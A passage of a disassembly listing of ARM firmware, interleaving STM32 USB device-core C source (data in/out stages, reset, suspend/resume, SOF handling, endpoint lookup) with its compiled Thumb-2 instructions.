 800b372:	68fb      	ldr	r3, [r7, #12]
 800b374:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b378:	7dba      	ldrb	r2, [r7, #22]
 800b37a:	68fb      	ldr	r3, [r7, #12]
 800b37c:	32ae      	adds	r2, #174	; 0xae
 800b37e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b382:	691b      	ldr	r3, [r3, #16]
 800b384:	68f8      	ldr	r0, [r7, #12]
 800b386:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b388:	68f8      	ldr	r0, [r7, #12]
 800b38a:	f001 f8e9 	bl	800c560 <USBD_CtlSendStatus>
 800b38e:	e032      	b.n	800b3f6 <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b390:	7afb      	ldrb	r3, [r7, #11]
 800b392:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b396:	b2db      	uxtb	r3, r3
 800b398:	4619      	mov	r1, r3
 800b39a:	68f8      	ldr	r0, [r7, #12]
 800b39c:	f000 f9a5 	bl	800b6ea <USBD_CoreFindEP>
 800b3a0:	4603      	mov	r3, r0
 800b3a2:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b3a4:	7dbb      	ldrb	r3, [r7, #22]
 800b3a6:	2bff      	cmp	r3, #255	; 0xff
 800b3a8:	d025      	beq.n	800b3f6 <USBD_LL_DataOutStage+0x15c>
 800b3aa:	7dbb      	ldrb	r3, [r7, #22]
 800b3ac:	2b00      	cmp	r3, #0
 800b3ae:	d122      	bne.n	800b3f6 <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b3b0:	68fb      	ldr	r3, [r7, #12]
 800b3b2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3b6:	b2db      	uxtb	r3, r3
 800b3b8:	2b03      	cmp	r3, #3
 800b3ba:	d117      	bne.n	800b3ec <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b3bc:	7dba      	ldrb	r2, [r7, #22]
 800b3be:	68fb      	ldr	r3, [r7, #12]
 800b3c0:	32ae      	adds	r2, #174	; 0xae
 800b3c2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b3c6:	699b      	ldr	r3, [r3, #24]
 800b3c8:	2b00      	cmp	r3, #0
 800b3ca:	d00f      	beq.n	800b3ec <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b3cc:	7dba      	ldrb	r2, [r7, #22]
 800b3ce:	68fb      	ldr	r3, [r7, #12]
 800b3d0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b3d4:	7dba      	ldrb	r2, [r7, #22]
 800b3d6:	68fb      	ldr	r3, [r7, #12]
 800b3d8:	32ae      	adds	r2, #174	; 0xae
 800b3da:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b3de:	699b      	ldr	r3, [r3, #24]
 800b3e0:	7afa      	ldrb	r2, [r7, #11]
 800b3e2:	4611      	mov	r1, r2
 800b3e4:	68f8      	ldr	r0, [r7, #12]
 800b3e6:	4798      	blx	r3
 800b3e8:	4603      	mov	r3, r0
 800b3ea:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b3ec:	7dfb      	ldrb	r3, [r7, #23]
 800b3ee:	2b00      	cmp	r3, #0
 800b3f0:	d001      	beq.n	800b3f6 <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b3f2:	7dfb      	ldrb	r3, [r7, #23]
 800b3f4:	e000      	b.n	800b3f8 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b3f6:	2300      	movs	r3, #0
}
 800b3f8:	4618      	mov	r0, r3
 800b3fa:	3718      	adds	r7, #24
 800b3fc:	46bd      	mov	sp, r7
 800b3fe:	bd80      	pop	{r7, pc}

0800b400 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b400:	b580      	push	{r7, lr}
 800b402:	b086      	sub	sp, #24
 800b404:	af00      	add	r7, sp, #0
 800b406:	60f8      	str	r0, [r7, #12]
 800b408:	460b      	mov	r3, r1
 800b40a:	607a      	str	r2, [r7, #4]
 800b40c:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b40e:	7afb      	ldrb	r3, [r7, #11]
 800b410:	2b00      	cmp	r3, #0
 800b412:	d16f      	bne.n	800b4f4 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b414:	68fb      	ldr	r3, [r7, #12]
 800b416:	3314      	adds	r3, #20
 800b418:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b41a:	68fb      	ldr	r3, [r7, #12]
 800b41c:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b420:	2b02      	cmp	r3, #2
 800b422:	d15a      	bne.n	800b4da <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b424:	693b      	ldr	r3, [r7, #16]
 800b426:	689a      	ldr	r2, [r3, #8]
 800b428:	693b      	ldr	r3, [r7, #16]
 800b42a:	68db      	ldr	r3, [r3, #12]
 800b42c:	429a      	cmp	r2, r3
 800b42e:	d914      	bls.n	800b45a <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b430:	693b      	ldr	r3, [r7, #16]
 800b432:	689a      	ldr	r2, [r3, #8]
 800b434:	693b      	ldr	r3, [r7, #16]
 800b436:	68db      	ldr	r3, [r3, #12]
 800b438:	1ad2      	subs	r2, r2, r3
 800b43a:	693b      	ldr	r3, [r7, #16]
 800b43c:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b43e:	693b      	ldr	r3, [r7, #16]
 800b440:	689b      	ldr	r3, [r3, #8]
 800b442:	461a      	mov	r2, r3
 800b444:	6879      	ldr	r1, [r7, #4]
 800b446:	68f8      	ldr	r0, [r7, #12]
 800b448:	f001 f84b 	bl	800c4e2 <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b44c:	2300      	movs	r3, #0
 800b44e:	2200      	movs	r2, #0
 800b450:	2100      	movs	r1, #0
 800b452:	68f8      	ldr	r0, [r7, #12]
 800b454:	f001 fe34 	bl	800d0c0 <USBD_LL_PrepareReceive>
 800b458:	e03f      	b.n	800b4da <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b45a:	693b      	ldr	r3, [r7, #16]
 800b45c:	68da      	ldr	r2, [r3, #12]
 800b45e:	693b      	ldr	r3, [r7, #16]
 800b460:	689b      	ldr	r3, [r3, #8]
 800b462:	429a      	cmp	r2, r3
 800b464:	d11c      	bne.n	800b4a0 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b466:	693b      	ldr	r3, [r7, #16]
 800b468:	685a      	ldr	r2, [r3, #4]
 800b46a:	693b      	ldr	r3, [r7, #16]
 800b46c:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b46e:	429a      	cmp	r2, r3
 800b470:	d316      	bcc.n	800b4a0 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b472:	693b      	ldr	r3, [r7, #16]
 800b474:	685a      	ldr	r2, [r3, #4]
 800b476:	68fb      	ldr	r3, [r7, #12]
 800b478:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b47c:	429a      	cmp	r2, r3
 800b47e:	d20f      	bcs.n	800b4a0 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b480:	2200      	movs	r2, #0
 800b482:	2100      	movs	r1, #0
 800b484:	68f8      	ldr	r0, [r7, #12]
 800b486:	f001 f82c 	bl	800c4e2 <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b48a:	68fb      	ldr	r3, [r7, #12]
 800b48c:	2200      	movs	r2, #0
 800b48e:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b492:	2300      	movs	r3, #0
 800b494:	2200      	movs	r2, #0
 800b496:	2100      	movs	r1, #0
 800b498:	68f8      	ldr	r0, [r7, #12]
 800b49a:	f001 fe11 	bl	800d0c0 <USBD_LL_PrepareReceive>
 800b49e:	e01c      	b.n	800b4da <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b4a0:	68fb      	ldr	r3, [r7, #12]
 800b4a2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b4a6:	b2db      	uxtb	r3, r3
 800b4a8:	2b03      	cmp	r3, #3
 800b4aa:	d10f      	bne.n	800b4cc <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b4ac:	68fb      	ldr	r3, [r7, #12]
 800b4ae:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4b2:	68db      	ldr	r3, [r3, #12]
 800b4b4:	2b00      	cmp	r3, #0
 800b4b6:	d009      	beq.n	800b4cc <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b4b8:	68fb      	ldr	r3, [r7, #12]
 800b4ba:	2200      	movs	r2, #0
 800b4bc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b4c0:	68fb      	ldr	r3, [r7, #12]
 800b4c2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b4c6:	68db      	ldr	r3, [r3, #12]
 800b4c8:	68f8      	ldr	r0, [r7, #12]
 800b4ca:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b4cc:	2180      	movs	r1, #128	; 0x80
 800b4ce:	68f8      	ldr	r0, [r7, #12]
 800b4d0:	f001 fcee 	bl	800ceb0 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b4d4:	68f8      	ldr	r0, [r7, #12]
 800b4d6:	f001 f856 	bl	800c586 <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b4da:	68fb      	ldr	r3, [r7, #12]
 800b4dc:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b4e0:	2b00      	cmp	r3, #0
 800b4e2:	d03a      	beq.n	800b55a <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b4e4:	68f8      	ldr	r0, [r7, #12]
 800b4e6:	f7ff fe42 	bl	800b16e <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b4ea:	68fb      	ldr	r3, [r7, #12]
 800b4ec:	2200      	movs	r2, #0
 800b4ee:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b4f2:	e032      	b.n	800b55a <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b4f4:	7afb      	ldrb	r3, [r7, #11]
 800b4f6:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b4fa:	b2db      	uxtb	r3, r3
 800b4fc:	4619      	mov	r1, r3
 800b4fe:	68f8      	ldr	r0, [r7, #12]
 800b500:	f000 f8f3 	bl	800b6ea <USBD_CoreFindEP>
 800b504:	4603      	mov	r3, r0
 800b506:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b508:	7dfb      	ldrb	r3, [r7, #23]
 800b50a:	2bff      	cmp	r3, #255	; 0xff
 800b50c:	d025      	beq.n	800b55a <USBD_LL_DataInStage+0x15a>
 800b50e:	7dfb      	ldrb	r3, [r7, #23]
 800b510:	2b00      	cmp	r3, #0
 800b512:	d122      	bne.n	800b55a <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b514:	68fb      	ldr	r3, [r7, #12]
 800b516:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b51a:	b2db      	uxtb	r3, r3
 800b51c:	2b03      	cmp	r3, #3
 800b51e:	d11c      	bne.n	800b55a <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b520:	7dfa      	ldrb	r2, [r7, #23]
 800b522:	68fb      	ldr	r3, [r7, #12]
 800b524:	32ae      	adds	r2, #174	; 0xae
 800b526:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b52a:	695b      	ldr	r3, [r3, #20]
 800b52c:	2b00      	cmp	r3, #0
 800b52e:	d014      	beq.n	800b55a <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b530:	7dfa      	ldrb	r2, [r7, #23]
 800b532:	68fb      	ldr	r3, [r7, #12]
 800b534:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b538:	7dfa      	ldrb	r2, [r7, #23]
 800b53a:	68fb      	ldr	r3, [r7, #12]
 800b53c:	32ae      	adds	r2, #174	; 0xae
 800b53e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b542:	695b      	ldr	r3, [r3, #20]
 800b544:	7afa      	ldrb	r2, [r7, #11]
 800b546:	4611      	mov	r1, r2
 800b548:	68f8      	ldr	r0, [r7, #12]
 800b54a:	4798      	blx	r3
 800b54c:	4603      	mov	r3, r0
 800b54e:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b550:	7dbb      	ldrb	r3, [r7, #22]
 800b552:	2b00      	cmp	r3, #0
 800b554:	d001      	beq.n	800b55a <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b556:	7dbb      	ldrb	r3, [r7, #22]
 800b558:	e000      	b.n	800b55c <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b55a:	2300      	movs	r3, #0
}
 800b55c:	4618      	mov	r0, r3
 800b55e:	3718      	adds	r7, #24
 800b560:	46bd      	mov	sp, r7
 800b562:	bd80      	pop	{r7, pc}

0800b564 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b564:	b580      	push	{r7, lr}
 800b566:	b084      	sub	sp, #16
 800b568:	af00      	add	r7, sp, #0
 800b56a:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b56c:	2300      	movs	r3, #0
 800b56e:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b570:	687b      	ldr	r3, [r7, #4]
 800b572:	2201      	movs	r2, #1
 800b574:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b578:	687b      	ldr	r3, [r7, #4]
 800b57a:	2200      	movs	r2, #0
 800b57c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b580:	687b      	ldr	r3, [r7, #4]
 800b582:	2200      	movs	r2, #0
 800b584:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b586:	687b      	ldr	r3, [r7, #4]
 800b588:	2200      	movs	r2, #0
 800b58a:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b58e:	687b      	ldr	r3, [r7, #4]
 800b590:	2200      	movs	r2, #0
 800b592:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b596:	687b      	ldr	r3, [r7, #4]
 800b598:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b59c:	2b00      	cmp	r3, #0
 800b59e:	d014      	beq.n	800b5ca <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b5a0:	687b      	ldr	r3, [r7, #4]
 800b5a2:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b5a6:	685b      	ldr	r3, [r3, #4]
 800b5a8:	2b00      	cmp	r3, #0
 800b5aa:	d00e      	beq.n	800b5ca <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b5ac:	687b      	ldr	r3, [r7, #4]
 800b5ae:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b5b2:	685b      	ldr	r3, [r3, #4]
 800b5b4:	687a      	ldr	r2, [r7, #4]
 800b5b6:	6852      	ldr	r2, [r2, #4]
 800b5b8:	b2d2      	uxtb	r2, r2
 800b5ba:	4611      	mov	r1, r2
 800b5bc:	6878      	ldr	r0, [r7, #4]
 800b5be:	4798      	blx	r3
 800b5c0:	4603      	mov	r3, r0
 800b5c2:	2b00      	cmp	r3, #0
 800b5c4:	d001      	beq.n	800b5ca <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b5c6:	2303      	movs	r3, #3
 800b5c8:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b5ca:	2340      	movs	r3, #64	; 0x40
 800b5cc:	2200      	movs	r2, #0
 800b5ce:	2100      	movs	r1, #0
 800b5d0:	6878      	ldr	r0, [r7, #4]
 800b5d2:	f001 fbc3 	bl	800cd5c <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b5d6:	687b      	ldr	r3, [r7, #4]
 800b5d8:	2201      	movs	r2, #1
 800b5da:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b5de:	687b      	ldr	r3, [r7, #4]
 800b5e0:	2240      	movs	r2, #64	; 0x40
 800b5e2:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b5e6:	2340      	movs	r3, #64	; 0x40
 800b5e8:	2200      	movs	r2, #0
 800b5ea:	2180      	movs	r1, #128	; 0x80
 800b5ec:	6878      	ldr	r0, [r7, #4]
 800b5ee:	f001 fbb5 	bl	800cd5c <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b5f2:	687b      	ldr	r3, [r7, #4]
 800b5f4:	2201      	movs	r2, #1
 800b5f6:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b5f8:	687b      	ldr	r3, [r7, #4]
 800b5fa:	2240      	movs	r2, #64	; 0x40
 800b5fc:	621a      	str	r2, [r3, #32]

  return ret;
 800b5fe:	7bfb      	ldrb	r3, [r7, #15]
}
 800b600:	4618      	mov	r0, r3
 800b602:	3710      	adds	r7, #16
 800b604:	46bd      	mov	sp, r7
 800b606:	bd80      	pop	{r7, pc}

0800b608 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b608:	b480      	push	{r7}
 800b60a:	b083      	sub	sp, #12
 800b60c:	af00      	add	r7, sp, #0
 800b60e:	6078      	str	r0, [r7, #4]
 800b610:	460b      	mov	r3, r1
 800b612:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b614:	687b      	ldr	r3, [r7, #4]
 800b616:	78fa      	ldrb	r2, [r7, #3]
 800b618:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b61a:	2300      	movs	r3, #0
}
 800b61c:	4618      	mov	r0, r3
 800b61e:	370c      	adds	r7, #12
 800b620:	46bd      	mov	sp, r7
 800b622:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b626:	4770      	bx	lr

0800b628 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b628:	b480      	push	{r7}
 800b62a:	b083      	sub	sp, #12
 800b62c:	af00      	add	r7, sp, #0
 800b62e:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b630:	687b      	ldr	r3, [r7, #4]
 800b632:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b636:	b2db      	uxtb	r3, r3
 800b638:	2b04      	cmp	r3, #4
 800b63a:	d006      	beq.n	800b64a <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b63c:	687b      	ldr	r3, [r7, #4]
 800b63e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b642:	b2da      	uxtb	r2, r3
 800b644:	687b      	ldr	r3, [r7, #4]
 800b646:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b64a:	687b      	ldr	r3, [r7, #4]
 800b64c:	2204      	movs	r2, #4
 800b64e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b652:	2300      	movs	r3, #0
}
 800b654:	4618      	mov	r0, r3
 800b656:	370c      	adds	r7, #12
 800b658:	46bd      	mov	sp, r7
 800b65a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b65e:	4770      	bx	lr

0800b660 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b660:	b480      	push	{r7}
 800b662:	b083      	sub	sp, #12
 800b664:	af00      	add	r7, sp, #0
 800b666:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b668:	687b      	ldr	r3, [r7, #4]
 800b66a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b66e:	b2db      	uxtb	r3, r3
 800b670:	2b04      	cmp	r3, #4
 800b672:	d106      	bne.n	800b682 <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b674:	687b      	ldr	r3, [r7, #4]
 800b676:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b67a:	b2da      	uxtb	r2, r3
 800b67c:	687b      	ldr	r3, [r7, #4]
 800b67e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b682:	2300      	movs	r3, #0
}
 800b684:	4618      	mov	r0, r3
 800b686:	370c      	adds	r7, #12
 800b688:	46bd      	mov	sp, r7
 800b68a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b68e:	4770      	bx	lr

0800b690 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b690:	b580      	push	{r7, lr}
 800b692:	b082      	sub	sp, #8
 800b694:	af00      	add	r7, sp, #0
 800b696:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b698:	687b      	ldr	r3, [r7, #4]
 800b69a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b69e:	b2db      	uxtb	r3, r3
 800b6a0:	2b03      	cmp	r3, #3
 800b6a2:	d110      	bne.n	800b6c6 <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b6a4:	687b      	ldr	r3, [r7, #4]
 800b6a6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b6aa:	2b00      	cmp	r3, #0
 800b6ac:	d00b      	beq.n	800b6c6 <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b6ae:	687b      	ldr	r3, [r7, #4]
 800b6b0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b6b4:	69db      	ldr	r3, [r3, #28]
 800b6b6:	2b00      	cmp	r3, #0
 800b6b8:	d005      	beq.n	800b6c6 <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b6ba:	687b      	ldr	r3, [r7, #4]
 800b6bc:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b6c0:	69db      	ldr	r3, [r3, #28]
 800b6c2:	6878      	ldr	r0, [r7, #4]
 800b6c4:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b6c6:	2300      	movs	r3, #0
}
 800b6c8:	4618      	mov	r0, r3
 800b6ca:	3708      	adds	r7, #8
 800b6cc:	46bd      	mov	sp, r7
 800b6ce:	bd80      	pop	{r7, pc}

0800b6d0 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b6d0:	b480      	push	{r7}
 800b6d2:	b083      	sub	sp, #12
 800b6d4:	af00      	add	r7, sp, #0
 800b6d6:	6078      	str	r0, [r7, #4]
 800b6d8:	460b      	mov	r3, r1
 800b6da:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b6dc:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b6de:	4618      	mov	r0, r3
 800b6e0:	370c      	adds	r7, #12
 800b6e2:	46bd      	mov	sp, r7
 800b6e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b6e8:	4770      	bx	lr

0800b6ea <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b6ea:	b480      	push	{r7}
 800b6ec:	b083      	sub	sp, #12
 800b6ee:	af00      	add	r7, sp, #0
 800b6f0:	6078      	str	r0, [r7, #4]
 800b6f2:	460b      	mov	r3, r1
 800b6f4:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b6f6:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b6f8:	4618      	mov	r0, r3
 800b6fa:	370c      	adds	r7, #12
 800b6fc:	46bd      	mov	sp, r7
 800b6fe:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b702:	4770      	bx	lr

0800b704 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b704:	b580      	push	{r7, lr}
 800b706:	b086      	sub	sp, #24
 800b708:	af00      	add	r7, sp, #0
 800b70a:	6078      	str	r0, [r7, #4]
 800b70c:	460b      	mov	r3, r1
 800b70e:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b710:	687b      	ldr	r3, [r7, #4]
 800b712:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b714:	687b      	ldr	r3, [r7, #4]
 800b716:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b718:	2300      	movs	r3, #0
 800b71a:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b71c:	68fb      	ldr	r3, [r7, #12]
 800b71e:	885b      	ldrh	r3, [r3, #2]
 800b720:	b29a      	uxth	r2, r3
 800b722:	68fb      	ldr	r3, [r7, #12]
 800b724:	781b      	ldrb	r3, [r3, #0]
 800b726:	b29b      	uxth	r3, r3
 800b728:	429a      	cmp	r2, r3
 800b72a:	d920      	bls.n	800b76e <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b72c:	68fb      	ldr	r3, [r7, #12]
 800b72e:	781b      	ldrb	r3, [r3, #0]
 800b730:	b29b      	uxth	r3, r3
